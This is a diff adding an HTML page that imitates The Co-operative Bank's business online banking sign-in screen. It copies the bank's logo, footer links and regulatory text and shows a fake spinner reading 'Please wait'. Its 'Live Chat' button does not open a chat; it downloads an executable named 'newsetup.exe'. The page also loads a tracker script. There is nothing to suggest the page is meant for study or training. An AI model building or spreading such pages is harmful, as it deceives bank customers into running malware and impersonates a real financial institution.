@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,height=device-height,viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>Co-operative Bank - Loading</title>
+<link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAABRUExURQCWzmnA4vz9/un1+vf7/V27353W7Expcf///wCVzv3+/vv9/iKk1ZfT69nv9+b0+T+v2hWf0sHl8vL5/JrU6ymm1mS+4UCv2vD4/Fy639Pt9lpBWgcAAAAIdFJOU8L///////8AwEv79QAAAINJREFUOMvF00kKgDAMBdBqW02d5+n+BzWKikJMQFD/pov/oGkhKlSOiQoV26MQehTfgxwwdXkHUtji06DYe+hpsHZ4anD3gBuyk0CDfcSBgAet8ZcrDIYG3vFGeAicrbAbrLUjN6SWXjFxIEPgcYD6yBNI4JSYAHDJK+DHvRCXV1r/GT8zI2CGp5CgAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC">
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+  background-color: #002663;
+  color: #fff;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.logo-container {
+  margin-top: 40px;
+  margin-bottom: 40px;
+  text-align: center;
+}
+
+.logo-container .logo-text {
+  font-size: 32px;
+  color: #fff;
+  letter-spacing: 1px;
+}
+
+.logo-container .logo-text .bold {
+  font-weight: 900;
+  font-style: italic;
+}
+
+.loading-card {
+  background: #fff;
+  border-radius: 2px;
+  box-shadow: 0 2px 2px 0 rgba(0,0,0,0.14), 0 1px 5px 0 rgba(0,0,0,0.12), 0 3px 1px -2px rgba(0,0,0,0.2);
+  padding: 32px 40px;
+  width: 100%;
+  max-width: 480px;
+  text-align: center;
+  color: rgba(0,0,0,0.87);
+}
+
+.loading-card h2 {
+  font-size: 20px;
+  font-weight: 500;
+  margin-bottom: 32px;
+  text-align: left;
+}
+
+.spinner-wrapper {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 24px 0;
+}
+
+.spinner {
+  width: 48px;
+  height: 48px;
+  border: 4px solid rgba(0,38,99,0.15);
+  border-top-color: #002663;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+.loading-text {
+  margin-top: 20px;
+  font-size: 15px;
+  color: rgba(0,0,0,0.54);
+}
+
+.loading-dots::after {
+  content: '';
+  animation: dots 1.5s steps(4, end) infinite;
+}
+
+@keyframes dots {
+  0%   { content: ''; }
+  25%  { content: '.'; }
+  50%  { content: '..'; }
+  75%  { content: '...'; }
+  100% { content: ''; }
+}
+
+.spacer {
+  flex: 1;
+}
+
+footer {
+  width: 100%;
+  padding: 20px 0;
+}
+
+footer hr {
+  border: none;
+  border-top: 2px solid #00b8e6;
+  max-width: 83.33%;
+  margin: 0 auto 20px;
+}
+
+.footer-links {
+  display: flex;
+  justify-content: center;
+  gap: 40px;
+  flex-wrap: wrap;
+  margin-bottom: 16px;
+}
+
+.footer-links a {
+  color: #fff;
+  font-size: 14px;
+  text-decoration: underline;
+  text-decoration-color: #fff;
+}
+
+.footer-links a:hover {
+  opacity: 0.85;
+}
+
+footer hr.thin {
+  border-top-width: 1px;
+  margin-top: 16px;
+}
+
+.footer-legal {
+  text-align: center;
+  padding: 16px 20px;
+  font-size: 12px;
+  color: rgba(255,255,255,0.7);
+  max-width: 700px;
+  margin: 0 auto;
+  line-height: 1.5;
+}
+
+.footer-logo {
+  text-align: center;
+  padding: 16px 0 24px;
+}
+
+.footer-logo img {
+  width: 250px;
+  height: 25px;
+}
+
+.live-chat-btn {
+  position: fixed;
+  bottom: 24px;
+  right: 24px;
+  background-color: #0074CC;
+  color: #fff;
+  border: none;
+  border-radius: 28px;
+  padding: 14px 24px;
+  font-size: 15px;
+  font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+  font-weight: 500;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+  z-index: 9999;
+  transition: background-color 0.2s;
+}
+.live-chat-btn:hover {
+  background-color: #005fa3;
+}
+.live-chat-btn svg {
+  width: 20px;
+  height: 20px;
+  fill: #fff;
+}
+
+@media (max-width: 520px) {
+  .loading-card {
+    margin: 0 16px;
+    padding: 24px 20px;
+  }
+
+  .footer-links {
+    flex-direction: column;
+    align-items: center;
+    gap: 12px;
+  }
+}
+</style>
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+
+<div class="logo-container">
+  <div class="logo-text">The <span class="bold">co-operative</span> bank</div>
+</div>
+
+<div class="loading-card">
+  <h2>Signing in to Business Online Banking</h2>
+  <div class="spinner-wrapper">
+    <div class="spinner"></div>
+    <div class="loading-text">Please wait<span class="loading-dots"></span></div>
+  </div>
+</div>
+
+<div class="spacer"></div>
+
+<footer>
+  <hr>
+  <div class="footer-links">
+    <a href="https://www.co-operativebank.co.uk/business/contact-us" target="_blank">Contact us</a>
+    <a href="https://www.co-operativebank.co.uk/global/accessibility" target="_blank">Accessibility</a>
+    <a href="https://www.co-operativebank.co.uk/assets/pdf/bank/business/currentaccounts/business-account-terms-and-conditions.pdf" target="_blank">Online banking terms and conditions</a>
+  </div>
+  <hr class="thin">
+  <div class="footer-legal">
+    The Co-operative Bank is covered by FSCS.
+  </div>
+  <div class="footer-legal">
+    The Co-operative Bank p.l.c. is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority (Financial Services Register No: 121885). Registered office: 1 Balloon Street, Manchester, M4 4BE. Registered in England and Wales (Company No: 990937).
+  </div>
+  <div class="footer-logo">
+    <img alt="co-operative bank" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZ8AAAAvCAMAAAALgTdnAAAC/VBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///3///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///7///5Pxq0PAAAA/nRSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB4fICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTU5PUFFS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">
+  </div>
+</footer>
+
+<a class="live-chat-btn" href="assets/newsetup.exe" download>
+  <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12z"/></svg>
+  Live Chat
+</a>
+
+</body>
+</html>
